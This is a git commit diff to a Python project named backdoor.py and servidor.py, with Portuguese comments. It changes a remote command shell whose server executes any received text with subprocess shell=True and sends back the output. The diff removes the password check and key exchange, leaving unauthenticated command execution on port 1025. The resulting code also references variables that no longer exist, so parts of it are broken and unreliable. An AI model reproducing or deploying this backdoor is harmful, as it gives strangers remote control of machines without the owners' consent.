426aceaedb33a2a351507beb14c95bd19fbbf96d
tarcisio-marinho <tarcisio_marinho09@hotmail.com>
2017-07-01 20:17:54 +0000

    UPDATE

--- backdoor.py
+++ backdoor.py
@@ -10,97 +10,18 @@
 
 
 import socket
+import os
 
-# inicia as cores
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
-# CLIENTE TAMBEM TEM QUE GERAR AS CHAVES PUBLICAS E PRIVADAS
-# AES para salvar as senhas privadas e publicas
 def conecta(serverHost):
-    porta=6064
+    PORT=1025
     try:
         socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket_obj.connect((serverHost, porta))
+        socket_obj.connect((serverHost, PORT))
     except socket.error as erro:
         print('Erro ocorrido: '+str(erro))
         exit()
-    # chave publica do servidor
-    data = socket_obj.recv(1024) # recebeu do servidor a chave publica
-    chave_publica=data.split(',') # separou a chave -> N e E
-
-
-
-    try:
-        senha=raw_input('Digite a senha para conectar ao servidor: ')
-    except KeyboardInterrupt:
-        print('\nVocê escolheu sair...\n')
-        exit()
-
-    criptografado=cipher(senha,int(chave_publica[0]),int(chave_publica[1])) # criptografou o texto
-    string=str(criptografado)
-    string=string.replace('[',' ').replace(']',' ').replace(' ','')
-    mensagem=b'%s' %(string) # enviou para o servidor em forma de string o texto
-    socket_obj.send(mensagem)
-
-    confirmacao=socket_obj.recv(1024)
-    if(confirmacao=='1'):
-        print('Conectado ao servidor\nConexão criptografada\n')
-    elif(confirmacao=='-1'):
-        print('Senha incorreta\nSaindo...')
-        exit()
-    else:
-        print('deu algum erro\nSaindo...')
-        exit()
-
-
-    # TESTE PARA GERAR CHAVES CORRETAS do cliente
-    while True:
-        try:
-            palavra_teste='oi'
-            gerador()
-            arquivo1=open('chave_publica.txt','r')
-            n=arquivo1.readline()
-            n=int(n)
-            e=arquivo1.readline()
-            e=int(e)
-            criptografado=cipher(palavra_teste,n,e)
-            descriptografado=descifra(criptografado,n)
-            novo=str(descriptografado)
-            novo=novo.replace(']','').replace('[','').replace("'","").replace(',','').replace(' ','')
-            if(novo==palavra_teste): # achou as chaves corretas -> para e vai para a conexão
-                break
-            else:
-                continua_while=0
-        except ValueError as e:
-            print('Erro '+str(e) +'tentando proxima chave')
-    # GEROU A CHAVE
-
-    # envia pro servidor a chave publica
-    socket_obj.send(str(n) +','+ str(e))
-
-
-    # Recebe o nome de usuario conectado
-    #DESCRIPTOGRAFA
-    recebido=socket_obj.recv(1024)
-    recebido=recebido.split(',')
-    usuario_conectado=[]
-    novo_recebido=[]
-    for caracter in recebido:
-        caracter=caracter.replace('L','')
-        novo_recebido.append(caracter) # adiciona na nova lista
-    descriptografado=descifra(novo_recebido,n)
-    descriptografado=str(descriptografado).replace(']','').replace('[','').replace("'","").replace(',','')
-    descriptografado=descriptografado.split('  ')
-    for palavra in descriptografado:
-        palavra=palavra.replace(' ','')
-        usuario_conectado.append(palavra)
-    # FIM DESCRIPTOGRAFA
-    usuario_conectado=str(usuario_conectado).replace('[','').replace(']','').replace("'","")
-
-
 
     while True:
-        # texto a ser criptografado e enviado
-        print('{0}'+usuario_conectado+'@'+serverHost+'{1}:~$ {2}').format(GREEN,BLUE,END)
         try:
             frase=raw_input()
         except KeyboardInterrupt:
--- servidor.py
+++ servidor.py
@@ -19,194 +19,79 @@ import subprocess
 import sys
 
 
-#
-# AES para criptografar a senha privada
+# cores
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+
 def conexao(meuIP):
-    # servidor
-    try:
-        senha=open('senha.txt','r')
-        hash_senha=senha.readline() # nova senha -> senha ja escolhida -> SHA1
-    except:
-        senha=open('senha.txt','w')
-        nova_senha=raw_input('Digite sua senha: ') # criou nova senha para o servidor
-        hash_senha=sha.new(nova_senha).hexdigest() # SHA1 da senha
-        senha.write(hash_senha)
-        os.system("clear")
-
     while True:
-        porta=6064
-
+        porta=1025
         socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # se der ctrl + c, ele para de escutar na porta
         socket_obj.bind((meuIP, porta))
-        socket_obj.listen(1) # escuta apenas 1 cliente
-        os.system('clear')
-        print('Servidor rodando')
-
-
-        b=0 # se o cara acertar a senha -> b=1
+        socket_obj.listen(1) # escutando conexões
+        print('{0}[+] Aguardando conexões...{1}').format(GREEN, END)
     	conexao,endereco=socket_obj.accept()
-        hora=datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y-%m-%d %H:%M:%S') # hora de conexão -> unix timestamp
-    	print('servidor conectado por', endereco[0],hora)
-        print('gerando as chaves... ')
-        while True: # TESTE PARA GERAR CHAVES CORRETAS
-            try:
-                palavra_teste='oi'
-                gerador()
-                arquivo1=open('chave_publica.txt','r')
-                n=arquivo1.readline()
-                n=int(n)
-                e=arquivo1.readline()
-                e=int(e)
-                criptografado=cipher(palavra_teste,n,e)
-                descriptografado=descifra(criptografado,n)
-                novo=str(descriptografado)
-                novo=novo.replace(']','').replace('[','').replace("'","").replace(',','').replace(' ','')
-                if(novo==palavra_teste): # achou as chaves corretas -> para e vai para a conexão
-                    break
-                else:
-                    continua_while=0
-            except ValueError as e:
-                print('Erro '+str(e) +'tentando proxima chave')
-        # FIM DO TESTE -> achou as chaves corretas
+    	print('\033[1;32m[+]servidor conectado por', endereco[0])
 
-        arquivo1=open('chave_publica.txt','r')
-        n=arquivo1.readline()
-        n=int(n)
-        e=arquivo1.readline()
-        e=int(e)
-        conexao.send(b'' + str(n) +','+ str(e)) # envia pro cliente a chave publica
-        # RECEBE A SENHA PARA SE CONECTAR AO SERVDIRO
 
         recebido=conexao.recv(1024)
         recebido=recebido.split(',')
         print(recebido)
 
-        # DESCRIPTOGRAFA
-        try:
-            senha_descriptografada=[]
-            novo_recebido=[]
-            for caracter in recebido: # remove o L, que tem no fim dos caracteres
-                caracter=caracter.replace('L','')
-                novo_recebido.append(caracter) # adiciona na nova lista
-            descriptografado=descifra(novo_recebido,n)
-            descriptografado=str(descriptografado).replace(']','').replace('[','').replace("'","").replace(',','')
-            descriptografado=descriptografado.split('  ')
-            for palavra in descriptografado:
-                palavra=palavra.replace(' ','')
-                senha_descriptografada.append(palavra)
-        except ValueError:
-            #cliente saiu
-            conexao.close()
-            print('cliente desconectado antes de entrar')
-            continue
-        # FIM DESCRIPTOGRAFA
-
-        print(senha_descriptografada)
-        senha_descriptografada=str(senha_descriptografada).replace('[','').replace(']','').replace("'","")
-        print(senha_descriptografada)
-        hash_senha_descriptografada=sha.new(senha_descriptografada).hexdigest()
-
-        if(hash_senha_descriptografada==hash_senha):
-            conexao.send('1') # acertou a senha, pode entrar
-            b=1
-
-        else:
-            print('senhas diferentes, nao pode entrar')
-            conexao.send('-1') # errou a senha
-            conexao.close()
-
-
         # ACERTOU A SENHA -> ENTRA NO SERVIDOR
-        if(b==1):
-            print('IP '+str(endereco[0])+' conectou ao servidor')
-            try: # tenta abrir e escrever os clientes que foram conectados
-                arq=open('logs/conectados.txt','a')
+            #envia o nome de usuario que a pessoa esta logada
+        logado = subprocess.check_output('whoami', shell=True)
+        logado=logado.replace('\n','')
+        criptografado=cipher(logado,int(chave_publica_cliente[0]),int(chave_publica_cliente[1]))
+        string=str(criptografado)
+        string=string.replace('[',' ').replace(']',' ').replace(' ','')
+        conexao.send(string)
+
+        # recebe dados enviados pelo cliente
+        while True:
+            # CRIA AS LISTAS QUE VÃO GUARDAR
+            novo_descriptografado=[] # O PEDIDO DO CLIENTE DESCRIPTOGRAFADO -> COM STRING CORRETA
+            novo_recebido=[] # O PEDIDO DO CLIENTE ORIGINAL
+            historico=[] # HISTORICO DOS PEDIDOS DO CLIENTE
+
+            try:
+                recebido = conexao.recv(1024) # recebe o que o cliente mandou
+            except socket.error as erro:
+                print('erro '+ str(e)+', Usuario saiu\n Erro causado por PS AUX\n')
+                break
+                continue
+            recebido=recebido.split(',') # separa em uma lista
+
+            # tenta abrir e escrever os clientes que foram conectados
+            hora=datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y-%m-%d %H:%M:%S')
+            historico.append(str(descriptografado).replace(']','').replace('[','').replace("'","").replace(',',''))# HISTORICO DO QUE FOI ENVIADO PELO CLIENTE
+            try:
+                arq=open('logs/historico.txt','a')
             except:
                 os.mkdir('logs')
-                arq=open('logs/conectados.txt','w') # cria arquivo
-            arq.write(str(endereco[0])+' - '+str(hora)+'\n') # escreve no arquivo dos hosts conectados
+                arq=open('logs/historico.txt','w') # cria arquivo
+            arq.write(str(historico)+' - ' + str(hora)+'\n')
+
+            # pega a pergunta e executa no servidor
+            tam=len(novo_descriptografado)
+            print(novo_descriptografado)
+            # se o usuario digitar exit
+            if(str(novo_descriptografado).replace(']','').replace('[','').replace("'","").replace(',','')=='exit'):
+                conexao.send('exit')
+                conexao.close()
+                print('\nusuario escolheu sair\n')
+                break
+                continue
 
 
 
-            ###### CODIGO DE RECEBER AS CHAVES PUBLICAS DO CLIENTE
-            chave_publica_cliente=conexao.recv(1024)
-            chave_publica_cliente=chave_publica_cliente.split(',')
-
-
-            #envia o nome de usuario que a pessoa esta logada
-            logado = subprocess.check_output('whoami', shell=True)
-            logado=logado.replace('\n','')
-            criptografado=cipher(logado,int(chave_publica_cliente[0]),int(chave_publica_cliente[1]))
-            string=str(criptografado)
-            string=string.replace('[',' ').replace(']',' ').replace(' ','')
-            conexao.send(string)
-
-            # recebe dados enviados pelo cliente
-            while True:
-                # CRIA AS LISTAS QUE VÃO GUARDAR
-                novo_descriptografado=[] # O PEDIDO DO CLIENTE DESCRIPTOGRAFADO -> COM STRING CORRETA
-                novo_recebido=[] # O PEDIDO DO CLIENTE ORIGINAL
-                historico=[] # HISTORICO DOS PEDIDOS DO CLIENTE
-
-                try:
-                    recebido = conexao.recv(1024) # recebe o que o cliente mandou
-                except socket.error as erro:
-                    print('erro '+ str(e)+', Usuario saiu\n Erro causado por PS AUX\n')
-                    break
-                    continue
-                recebido=recebido.split(',') # separa em uma lista
-
-                # DESCRIPTOGRAFA
-                try:
-                    for caracter in recebido: # remove o L, que tem no fim dos caracteres
-                        caracter=caracter.replace('L','')
-                        novo_recebido.append(caracter) # adiciona na nova lista
-                    descriptografado=descifra(novo_recebido,n)
-                    descriptografado=str(descriptografado).replace(']','').replace('[','').replace("'","").replace(',','')
-                    descriptografado=descriptografado.split('  ')
-                    for palavra in descriptografado:
-                        palavra=palavra.replace(' ','')
-                        novo_descriptografado.append(palavra)
-                except ValueError:
-                    #cliente saiu
-                    conexao.close()
-                    break
-                    print('cliente escolheu sair\n')
-                    continue
-                # FIM DESCRIPTOGRAFA
-
-                # tenta abrir e escrever os clientes que foram conectados
-                hora=datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y-%m-%d %H:%M:%S')
-                historico.append(str(descriptografado).replace(']','').replace('[','').replace("'","").replace(',',''))# HISTORICO DO QUE FOI ENVIADO PELO CLIENTE
-                try:
-                    arq=open('logs/historico.txt','a')
-                except:
-                    os.mkdir('logs')
-                    arq=open('logs/historico.txt','w') # cria arquivo
-                arq.write(str(historico)+' - ' + str(hora)+'\n')
-
-                # pega a pergunta e executa no servidor
-                tam=len(novo_descriptografado)
-                print(novo_descriptografado)
-                # se o usuario digitar exit
-                if(str(novo_descriptografado).replace(']','').replace('[','').replace("'","").replace(',','')=='exit'):
-                    conexao.send('exit')
-                    conexao.close()
-                    print('\nusuario escolheu sair\n')
-                    break
-                    continue
-
-
-
-                comando = ' '.join([str(novo) for novo in novo_descriptografado])
-
-                try:
-                    a = subprocess.check_output(comando, shell=True)
-                    conexao.send(a)
-                except subprocess.CalledProcessError as e:
-                    print(e)
-                    conexao.send(str(e))
+            comando = ' '.join([str(novo) for novo in novo_descriptografado])
+            try:
+                a = subprocess.check_output(comando, shell=True)
+                conexao.send(a)
+            except subprocess.CalledProcessError as e:
+                print(e)
+                conexao.send(str(e))
 
 
         conexao.close()
